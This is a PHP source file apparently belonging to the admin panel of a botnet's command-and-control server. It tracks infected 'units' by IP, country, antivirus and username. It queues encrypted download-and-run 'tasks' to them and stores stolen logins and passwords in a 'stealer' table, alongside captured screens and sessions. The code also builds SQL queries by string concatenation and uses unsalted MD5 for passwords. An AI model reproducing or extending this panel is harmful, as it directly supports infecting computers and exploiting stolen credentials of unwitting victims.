   function aAVUnitsCount($av)
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE av = "' . $av . '"');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetAVUnitsCount()
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, "SELECT av, COUNT(av) AS total FROM units GROUP BY av");
      mysqli_close($link);

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table style =\"border: 1px solid;\">
                  <tr height=\"35\">                       
                     <td><div align = left>&nbsp;" . $lang["0020"] . ":</div></td>
                     <td width=200><div align = center>" . $lang["0006"] . ":</div></td>   
                     <td width=200><div align = center>" . $lang["0015"] . ":</div></td>           
                  </tr>";

      while ($row = mysqli_fetch_array($result))
      {
         $gb = GetBG();
         echo "<tr height=\"35\">";
         echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\">&nbsp;" . $row['av'] . "</td>"; 
         echo "   <td bgcolor = " . $gb . "><div align = center>" . aAVUnitsCount($row['av']) . "</div></td>";

         $percent = aAVUnitsCount($row['av']) / (GetUnitsCount() / 100);

         if (strlen($percent) > 5)
         {
            $percent = substr($percent, 0, 5); 
         } 

         echo "   <td bgcolor = " . $gb . "><div align = center>" . $percent . "%</div></td>";
         echo "</tr>";
      }

      echo "</table>";
   }

   function aSidUnitsCount($sid)
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE sid = "' . $sid . '"');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetSidUnitsCount()
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, "SELECT sid, COUNT(sid) AS total FROM units GROUP BY sid");
      mysqli_close($link);

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table style =\"border: 1px solid;\">
                  <tr height=\"35\">                       
                     <td><div align = left>&nbsp;" . $lang["0021"] . ":</div></td>
                     <td width=200><div align = center>" . $lang["0006"] . ":</div></td>   
                     <td width=200><div align = center>" . $lang["0015"] . ":</div></td>           
                  </tr>";

      while ($row = mysqli_fetch_array($result))
      {
         $gb = GetBG();
         echo "<tr height=\"35\">";
         echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\">&nbsp;" . $row['sid'] . "</td>"; 
         echo "   <td bgcolor = " . $gb . "><div align = center>" . aSidUnitsCount($row['sid']) . "</div></td>";

         $percent = aSidUnitsCount($row['sid']) / (GetUnitsCount() / 100);

         if (strlen($percent) > 5)
         {
            $percent = substr($percent, 0, 5); 
         } 

         echo "   <td bgcolor = " . $gb . "><div align = center>" . $percent . "%</div></td>";
         echo "</tr>";
      }

      echo "</table>";
   }

   function SaveConfig($newlogin, $newpass, $oldpass, $obslogin, $obspass)
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");

      $clogin = $conf["login"];
      $cpass = $conf["password"];
      $cdbhost = $conf["dbhost"];
      $cdbname = $conf["dbname"];
      $cdbuser = $conf["dbuser"];
      $cdbpass = $conf["dbpass"];
      $crc4key = $conf["rc4key"];

      if ($cpass == md5($oldpass))
      {
         $pr = "    ";
         $cr = "\r\n";
         $rn = " = ";

         $content = $content . "<?php";
         $content = $content . $cr . $cr . $pr . $pr . "\$conf[\"login\"]" . $rn . "\"" . $newlogin . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"password\"]" . $rn . "\"" . md5($newpass) . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"observer_login\"]" . $rn . "\"" . $obslogin . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"observer_password\"]" . $rn . "\"" . md5($obspass) . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"dbhost\"]" . $rn . "\"" . $cdbhost . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"dbname\"]" . $rn . "\"" . $cdbname . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"dbuser\"]" . $rn . "\"" . $cdbuser . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"dbpass\"]" . $rn . "\"" . $cdbpass . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"rc4key\"]" . $rn . "\"" . $crc4key . "\";";
         $content = $content . $cr . $cr . "?>";

         file_put_contents("Cfg/Config.php", $content);
         echo "<meta http-equiv=\"refresh\" content=\"1; url=Settings.php\">"; 
      }
      else
      {
         echo "<table border=\"0\" width=\"100%\" height=\"300\">
                  <tr>
                     <td>
                        <div align = center>" . $lang["0164"] . "</div>
                     </td>
                  </tr>
               </table>";

         @header("Refresh: 5; url = Settings.php");
      }
   }

   function SaveSQL($newhost, $newname, $newuser, $newpass, $mainpass)
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");

      $clogin = $conf["login"];
      $cpass = $conf["password"];
      $ologin = $conf["observer_login"];
      $opass = $conf["observer_password"];
      $cdbhost = $conf["dbhost"];
      $cdbname = $conf["dbname"];
      $cdbuser = $conf["dbuser"];
      $cdbpass = $conf["dbpass"];
      $crc4key = $conf["rc4key"];

      if ($cpass == md5($mainpass))
      {
         $pr = "    ";
         $cr = "\r\n";
         $rn = " = ";

         $content = $content . "<?php";
         $content = $content . $cr . $cr . $pr . $pr . "\$conf[\"login\"]" . $rn . "\"" . $clogin . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"password\"]" . $rn . "\"" . $cpass . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"observer_login\"]" . $rn . "\"" . $ologin . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"observer_password\"]" . $rn . "\"" . $opass . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"dbhost\"]" . $rn . "\"" . $newhost . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"dbname\"]" . $rn . "\"" . $newname . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"dbuser\"]" . $rn . "\"" . $newuser . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"dbpass\"]" . $rn . "\"" . $newpass . "\";";
         $content = $content . $cr . $pr . $pr . "\$conf[\"rc4key\"]" . $rn . "\"" . $crc4key . "\";";
         $content = $content . $cr . $cr . "?>";

         file_put_contents("Cfg/Config.php", $content);
         echo "<meta http-equiv=\"refresh\" content=\"1; url=Settings.php\">"; 
      }
      else
      {
         echo "<table border=\"0\" width=\"100%\" height=\"300\">
                  <tr>
                     <td>
                        <div align = center>" . $lang["0164"] . "</div>
                     </td>
                  </tr>
               </table>";

         @header("Refresh: 5; url = Settings.php");
      }
   }

   function DeleteUnits()
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link,  $conf["dbname"]);      
      mysqli_query($link, 'DELETE FROM units');
      mysqli_query($link, 'DELETE FROM stealer'); 
      echo "<meta http-equiv=\"refresh\" content=\"1; url=Settings.php\">";    
   }
   
   function DeleteTasks() 
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link, $conf["dbname"]);   	   
      mysqli_query($link, 'DELETE FROM tasks');
      mysqli_query($link, 'DELETE FROM results');
      mysqli_query($link, 'TRUNCATE TABLE tasks_exec');
      echo "<meta http-equiv=\"refresh\" content=\"1; url=Settings.php\">"; 
   }

   function CreateTable()
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link, $conf["dbname"]);    
      mysqli_query($link, "CREATE TABLE IF NOT EXISTS `units` (`id` varchar(12) NOT NULL, `sid` varchar(10) NOT NULL, `lv` varchar(2) NOT NULL, `ip` varchar(15) NOT NULL, `first_ip` varchar(15) NOT NULL, `online` int(10) NOT NULL, `country` varchar(50) NOT NULL, `version` varchar(6) NOT NULL, `ar` varchar(10) NOT NULL, `arch` varchar(10) NOT NULL, `os` varchar(20) NOT NULL, `reg` int(10) NOT NULL, `av` varchar(15) NOT NULL, `pc` varchar(15) NOT NULL, `un` varchar(15) NOT NULL, `dm` varchar(25) NOT NULL, `og` varchar(1) NOT NULL, PRIMARY KEY (`id`)) ENGINE=MyISAM");
      mysqli_query($link, "CREATE TABLE IF NOT EXISTS `tasks_exec` (`id` int(12) NOT NULL AUTO_INCREMENT, `task_id` int(11) NOT NULL, `unitid` varchar(16) NOT NULL, `exec` tinyint(1) NOT NULL DEFAULT '0', PRIMARY KEY (`id`), KEY `unitid` (`unitid`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1");
      mysqli_query($link, "CREATE TABLE IF NOT EXISTS `tasks` (`id` int(12) NOT NULL AUTO_INCREMENT, `path` varchar(250) NOT NULL, `path_rc4` varchar(250) NOT NULL, `tid` varchar(250) NOT NULL, `comment` varchar(250) NOT NULL, `arc` varchar(250) NOT NULL, `run` tinyint(1) NOT NULL, `filetype` tinyint(1) NOT NULL, `folder` tinyint(1) NOT NULL, `tlimit` int(11) NOT NULL, `units` varchar(200) NOT NULL, `sids` varchar(200) NOT NULL, `country` varchar(250) NOT NULL, `status` tinyint(1) NOT NULL DEFAULT '1', `loads` int(11) NOT NULL DEFAULT '0', `exec` int(11) NOT NULL DEFAULT '0', `error` int(11) NOT NULL DEFAULT '0', `error2` int(11) NOT NULL DEFAULT '0', PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1000001");
      mysqli_query($link, "CREATE TABLE IF NOT EXISTS `stealer` (`hash` varchar(36) NOT NULL, `id` varchar(12) NOT NULL, `soft` varchar(15) NOT NULL, `time` int(10) NOT NULL, `type` varchar(15) NOT NULL, `host` varchar(255) NOT NULL, `login` varchar(255) NOT NULL, `password` varchar(255) NOT NULL, PRIMARY KEY (`hash`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1");
      mysqli_query($link, "CREATE TABLE IF NOT EXISTS `results` (`time` int(10) NOT NULL, `id` varchar(12) NOT NULL, `tid` varchar(12) NOT NULL, `res` int(1) NOT NULL, PRIMARY KEY (`time`)) ENGINE=MyISAM");      
      echo "<meta http-equiv=\"refresh\" content=\"1; url=Settings.php\">"; 
   }

   function SaveOptions($h, $u, $a, $d, $l, $r, $y, $s)
   {
      $pr = "    ";
      $cr = "\r\n";
      $rn = " = ";
      
      $content = $content . "<?php";    
      $content = $content . $cr . $pr . "\$options[\"show_domain\"] = " . '"' . $d .'";';
      $content = $content . $cr . $pr . "\$options[\"show_av\"] = " . '"' . $a .'";';
      $content = $content . $cr . $pr . "\$options[\"show_hostname\"] = " . '"' . $h .'";';
      $content = $content . $cr . $pr . "\$options[\"show_username\"] = " . '"' . $u .'";';
      $content = $content . $cr . $pr . "\$options[\"show_screen\"] = " . '"' . $s .'";';
      $content = $content . $cr . $pr . "\$options[\"show_il\"] = " . '"' . $l .'";';
      $content = $content . $cr . $pr . "\$options[\"show_reg\"] = " . '"' . $r .'";';

      if ($y == 0)
      {
         $content = $content . $cr . $pr . "\$options[\"language\"] = " . '"' . "En" .'";';
      }

      if ($y == 1)
      {
         $content = $content . $cr . $pr . "\$options[\"language\"] = " . '"' . "Ru" .'";';
      }

      $content = $content . $cr . "?>";

      file_put_contents("Cfg/Options.php", $content);
      echo "<meta http-equiv=\"refresh\" content=\"1; url=Settings.php\">";
   }

   function MakeFormOptions() 
   {  
      include("Cfg/Options.php");   
      include("Cfg/Lang.php");
      
      $res = "<div align=\"center\">
               <table border=\"0\" width=\"98%\" class=table cellspacing = \"0\" cellpadding=\"0\">
                  <tr>
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;" . $lang["0092"] . ":</td>
                  </tr>
                  <tr>
                     <td>
                        <div align=\"center\">
                           <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\">
                              <table border=\"0\" width=\"95%\" height=\"120\" class=table_lig cellspacing=\"0\" cellpadding=\"0\">                                   
                                 <tr>
                                    <td>" . $lang["0152"] . "</td>
                                       <td>
                                          <select name=\"op_lang\">"; 

                                          if ($options["language"] == "En")
                                          {
                                             $res = $res . "<option value=\"0\"selected>English</option><option value=\"1\" >Russian</option>" ;    
                                          }     
                     
                                          if ($options["language"] == "Ru")
                                          {
                                             $res = $res . "<option value=\"0\">Английский</option><option value=\"1\" selected>Русский</option>" ;    
                                          }    

                                          $res = $res . "</select>
                                       </td>
                                       <td>" . $lang["0153"] . "</td>
                                 </tr>          

                                 <tr>
                                    <td>" . $lang["0156"] . ":</td>";

                                    if ($options["show_screen"] == "1")
                                    {
                                       $res = $res . "<td><input type=\"checkbox\" name=\"op_showscreen\" checked=\"checked\" /></td>";
                                    }
                                    else
                                    {
                                       $res = $res . "<td><input type=\"checkbox\" name=\"op_showscreen\" /></td>";
                                    }

                                    $res = $res . "<td>" . $lang["0157"] . "</td>
                                 </tr> 

                                 <tr>
                                    <td>" . $lang["0093"] . ":</td>";

                                       if ($options["show_domain"] == "1")
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showdomain\" checked=\"checked\" /></td>";
                                       }
                                       else
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showdomain\" /></td>";
                                       }

                                       $res = $res . "<td>" . $lang["0094"] . ".</td>
                                 </tr>
                                 <tr>
                                       <td>" . $lang["0095"] . ":</td>";

                                       if ($options["show_hostname"] == "1")
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showhost\" checked=\"checked\" /></td>";
                                       }
                                       else
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showhost\" /></td>";
                                       }

                                       $res = $res . "<td>" . $lang["0108"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>" . $lang["0097"] . ":</td>";

                                       if ($options["show_username"] == "1")
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showuser\" checked=\"checked\" /></td>";
                                       }
                                       else
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showuser\" /></td>";
                                       }

                                       $res = $res . "<td>" . $lang["0098"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>" . $lang["0099"] . ":</td>";

                                       if ($options["show_av"] == "1")
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showav\" checked=\"checked\" /></td>";
                                       }
                                       else
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showav\" /></td>";
                                       }

                                       $res = $res . "<td>" . $lang["0100"] . "</td>
                                 </tr>   
                                 <tr>
                                    <td>" . $lang["0101"] . ":</td>";

                                       if ($options["show_il"] == "1")
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showil\" checked=\"checked\" /></td>";
                                       }
                                       else
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showil\" /></td>";
                                       }

                                       $res = $res . "<td>" . $lang["0102"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>" . $lang["0103"] . ":</td>";

                                       if ($options["show_reg"] == "1")
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showreg\" checked=\"checked\" /></td>";
                                       }
                                       else
                                       {
                                          $res = $res . "<td><input type=\"checkbox\" name=\"op_showreg\" /></td>";
                                       }

                                       $res = $res . "

                                       <td>" . $lang["0104"] . "</td>
                                 </tr>
                                 <tr><td>&nbsp;</td></tr>
                              </table>

                              <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
                                 <tr>
                                    <td>
                                          <div align=\"center\">
                                             <input type=\"submit\" name=\"options\" value=\"" . $lang["0105"] . "\" class=\"button\">
                                          </div>
                                    </td>
                                 </tr>
                                 <tr><td>&nbsp;</td></tr>
                              </table>

                           </form>
                        </div>
                     </td>
                  </tr>
               </table>
            </div>";

      return $res;
   }
    
   function MakeFormChangePass() 
   {          
      include("Cfg/Lang.php");
      $res = "<div align=\"center\">
                  <table border=\"0\" width=\"98%\" class=table cellspacing = \"0\" cellpadding=\"0\">
                     <tr>
                        <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;" . $lang["0106"] . ":</td>
                     </tr>
                     <tr>
                        <td>
                           <div align=\"center\">
                              <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\">
                                 <table border=\"0\" width=\"95%\" height=\"180\" class=table_lig cellspacing=\"0\" cellpadding=\"0\">
                                    <tr>
                                       <td>" . $lang["0107"] . ":</td>
                                       <td><input name=\"newlogin\" class=task value=\"root\" style=\"float: left\"></td>	            
                                       <td>" . $lang["0109"] . "</td>
                                    </tr>      
                                    <tr>
                                       <td width=\"300\">" . $lang["0110"] . ":</td>
                                       <td width=\"300\"><input name=\"newpass\" type=password class=task style=\"float: left\"></td>
                                       <td>" . $lang["0111"] . "</td>
                                    </tr>
                                    <tr>
                                       <td>" . $lang["0112"] .":</td>
                                       <td><input name=\"obslogin\" class=task value=\"observer\" style=\"float: left\"></td>		            
                                       <td>" . $lang["0113"] . "</td>
                                    </tr>
                                    <tr>
                                       <td>" . $lang["0114"] . ":</td>
                                       <td><input name=\"obspass\" type=password class=task style=\"float: left\"></td>
                                       <td>" . $lang["0115"] . "</td>
                                    </tr>
                                    <tr>
                                       <td>" . $lang["0116"] . " (" . $_SESSION['Name'] . "):</td>
                                       <td><input name=\"oldpass\" type=password class=task style=\"float: left\"></td>
                                       <td>" . $lang["0117"] . "</td>
                                    </tr>
                                    <tr>
                                       <td>&nbsp;</td>
                                    </tr>
                                 </table>
                                 
                                 <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
                                    <tr>
                                       <td>
                                          <div align=\"center\">
                                             <input type=\"submit\" name=\"submit\" value=\"" . $lang["0105"] . "\" class=\"button\">
                                          </div>
                                       </td>
                                    </tr>
                                    <tr><td>&nbsp;</td></tr>
                                 </table>

                              </form>
                           </div>
                        </td>
                     </tr>
                  </table>
               </div>";

      return $res;
   }       

   function MakeFormSQLsettings() 
   {          
      include("Cfg/Lang.php");
      $res = "<div align=\"center\">
               <table border=\"0\" width=\"98%\" class=table cellspacing = \"0\" cellpadding=\"0\">
                  <tr>
                     <td>
                        &nbsp;<img src=\"Images\Info.png\">&nbsp;" . $lang["0118"] . ":
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div align=\"center\">
                           <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\">
                              <table border=\"0\" width=\"95%\" height=\"180\" class=table_lig cellspacing=\"0\" cellpadding=\"0\">
                                 <tr>
                                    <td>" . $lang["0119"] . ":</td>
                                    <td><input name=\"sqlhost\" class=task value=\"localhost\" style=\"float: left\"></td>		            
                                    <td>" . $lang["0120"] . "</td>
                                 </tr>
                                 <tr>
                                    <td width=\"300\">" . $lang["0121"] . ":</td>
                                    <td width=\"300\"><input name=\"sqlname\" class=task style=\"float: left\"></td>
                                    <td>" . $lang["0122"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>" . $lang["0123"] . ":</td>
                                    <td><input name=\"sqluser\" class=task style=\"float: left\"></td>
                                    <td>" . $lang["0124"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>" . $lang["0129"] . ":</td>
                                    <td><input name=\"sqlpass\" type=password class=task style=\"float: left\"></td>
                                    <td>" . $lang["0126"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>" . $lang["0127"] . " (" . $_SESSION['Name'] . ")" . ":</td>
                                    <td><input name=\"oldpass\" type=password class=task style=\"float: left\"></td>
                                    <td>" . $lang["0128"] . "</td>
                                 </tr>	
                                 <tr>
                                    <td>&nbsp;</td>
                                 </tr>
                              </table>

                              <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
                                 <tr>
                                    <td>
                                       <div align=\"center\">
                                          <input type=\"submit\" name=\"sql\" value=\"" .  $lang["0105"] . "\" class=\"button\">
                                       </div>
                                    </td>
                                 </tr>
                                 <tr><td>&nbsp;</td></tr>
                              </table>

                           </form>
                        </div>
                     </td>
                  </tr>
               </table>
            </div>";

      return $res;
   }         

   function MakeFormCleaningDB() 
   {              
      include("Cfg/Lang.php");
      $res = "<div align=\"center\">
               <table border=\"0\" width=\"98%\" class=table cellspacing = \"0\" cellpadding=\"0\">
                  <tr>
                     <td>
                        &nbsp;<img src=\"Images\Info.png\">&nbsp;" . $lang["0130"]  .":
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div align=\"center\">
                           <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\">
                              <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\">
                                 <tr>
                                    <td>&nbsp;</td>
                                    <td>
                                          <div align=\"center\">
                                             <input type=\"submit\" name=\"clear\" value=\"" . $lang["0131"] . "\" class=\"button\">
                                          </div>
                                       </td>	              
                                    <td>&nbsp;</td>
                                 </tr>
                              </table>
                           </form>                       
                        </div>
                     </td>
                  </tr>
                  <tr><td>&nbsp;</td></tr>
               </table>
            </div>";

      return $res;
   }        

   function MakeFormCleaningTask() 
   {      
      include("Cfg/Lang.php");        
      $res = "<div align=\"center\">
               <table border=\"0\" width=\"98%\" class=table cellspacing = \"0\" cellpadding=\"0\">
                  <tr>
                     <td>
                        &nbsp;<img src=\"Images\Info.png\">&nbsp;" . $lang["0132"] . ":
                     </td>
                  </tr>

                  <tr>
                     <td>
                        <div align=\"center\">
                           <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\">       
                              <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\">
                                 <tr>
                                    <td>&nbsp;</td>

                                    <td>
                                       <div align=\"center\">
                                          <input type=\"submit\" name=\"cleartasks\" value=\"" . $lang["0133"] . "\" class=\"button\" style=\"float: center\">
                                       </div>
                                    </td>
                  
                                    <td>&nbsp;</td>
                                 </tr>
                                 <tr><td>&nbsp;</td></tr>
                              </table>
                           </form>                           
                        </div>
                     </td>
                  </tr>
               </table>
            </div>";

      return $res;
   } 

   function MakeFormCreateTable() 
   {              
      include("Cfg/Lang.php");
      $res = "<div align=\"center\">
               <table border=\"0\" width=\"98%\" class=table cellspacing = \"0\" cellpadding=\"0\">
                  <tr>
                     <td>
                        &nbsp;<img src=\"Images\Info.png\">&nbsp;" . $lang["0134"] . ":
                     </td>
                  </tr>

                  <tr>
                     <td>
                        <div align=\"center\">
                           <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\">       
                              <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\">
                                 <tr>		                                 
                                    <td>
                                       <div align=\"center\">
                                          <input type=\"submit\" name=\"createtable\" value=\"" . $lang["0135"] . "\" class=\"button\" style=\"float: center\">
                                       </div>
                                       
                                    </td>		                                               
                                 </tr>
                                 <tr><td>&nbsp;</td></tr>
                              </table>
                           </form>                           
                        </div>
                     </td>
                  </tr>
               </table>
            </div>";

      return $res;
   }

   function ScrCount()
   {
      return count(array_diff(scandir("./Screens"), [".", ".."]));
   }

   function WalCount()
   {
      return count(array_diff(scandir("./Sessions"), [".", ".."]));
   }

   function _getServerLoadLinuxData()
   {
      if (is_readable("/proc/stat"))
      {
         $stats = @file_get_contents("/proc/stat");

         if ($stats !== false)
         {
            $stats = preg_replace("/[[:blank:]]+/", " ", $stats);
            $stats = str_replace(array("\r\n", "\n\r", "\r"), "\n", $stats);
            $stats = explode("\n", $stats);

            foreach ($stats as $statLine)
            {
               $statLineData = explode(" ", trim($statLine));

               if ((count($statLineData) >= 5) && ($statLineData[0] == "cpu"))
               {
                  return array($statLineData[1], $statLineData[2], $statLineData[3], $statLineData[4],);
               }
            }
         }
      }

      return null;
   }

   function getServerLoad()
   {
     $load = null;

     if (stristr(PHP_OS, "win"))
     {
        $cmd = "wmic cpu get loadpercentage /all";
        @exec($cmd, $output);

        if ($output)
        {
          foreach ($output as $line)
          {
             if ($line && preg_match("/^[0-9]+\$/", $line))
             {
                $load = $line;
                break;
             }
           }
         }
     }
     else
     {
        if (is_readable("/proc/stat"))
        {
           $statData1 = _getServerLoadLinuxData();
           sleep(1);
           $statData2 = _getServerLoadLinuxData();

           if ((!is_null($statData1)) && (!is_null($statData2)))
           {
                    $statData2[0] -= $statData1[0];
                    $statData2[1] -= $statData1[1];
                    $statData2[2] -= $statData1[2];
                    $statData2[3] -= $statData1[3];
                    $cpuTime = $statData2[0] + $statData2[1] + $statData2[2] + $statData2[3];
                    $load = 100 - ($statData2[3] * 100 / $cpuTime);

                    if (strpos($load, ".") > 0)
                    {
                       $load = substr($load, 0, strpos($load, ".")) . "%";
                    }
                    else
                    {
                       $load = $load . "%";
                    }
           }
        }
     }

     return $load;
   }

?> 